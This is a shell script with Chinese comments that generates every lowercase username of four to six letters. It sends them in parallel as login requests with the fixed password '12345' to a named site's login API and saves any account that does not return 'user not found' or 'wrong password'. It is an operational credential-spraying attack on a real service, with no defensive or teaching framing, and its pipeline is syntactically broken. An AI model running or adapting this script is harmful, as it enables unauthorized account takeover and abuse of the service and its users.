#!/bin/sh

URL="https://emby.yun/api/embyUser/login"
PASS="12345"
THREAD=10

# 4位 aaaa → zzzz
for c1 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
for c2 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
for c3 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
for c4 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  echo "$c1$c2$c3$c4"
done
done
done
done

# 5位 aaaaa → zzzzz
for c1 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
for c2 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
for c3 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
for c4 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
for c5 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  echo "$c1$c2$c3$c4$c5"
done
done
done
done
done

# 6位 aaaaaa → zzzzzz
for c1 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
for c2 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
for c3 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
for c4 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
for c5 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
for c6 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  echo "$c1$c2$c3$c4$c5$c6"
done
done
done
done
done
done

# 上面是生成账号，下面是多线程请求
| xargs -P $THREAD -n 1 sh -c '
user="$1"
echo "尝试: $user"

res=$(curl -s --max-time 8 -X POST "'"$URL"'" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  -H "Content-Type: application/json" \
  -H "Origin: https://emby.yun" \
  -H "Referer: https://emby.yun/" \
  -d "{\"userName\":\"$user\",\"password\":\"'$PASS'\"}")

echo "响应: $res"

# 成功条件：有返回，且不是不存在、不是密码错
if [ -n "$res" ] &&
   ! echo "$res" | grep -q "用户不存在" &&
   ! echo "$res" | grep -q "密码错误"; then
  echo "
=============================================
✅ 成功！！
账号：$user
密码：'$PASS'
响应：$res
=============================================
"
  echo "$user:$PASS" >> success.txt
  exit 0
fi
' _
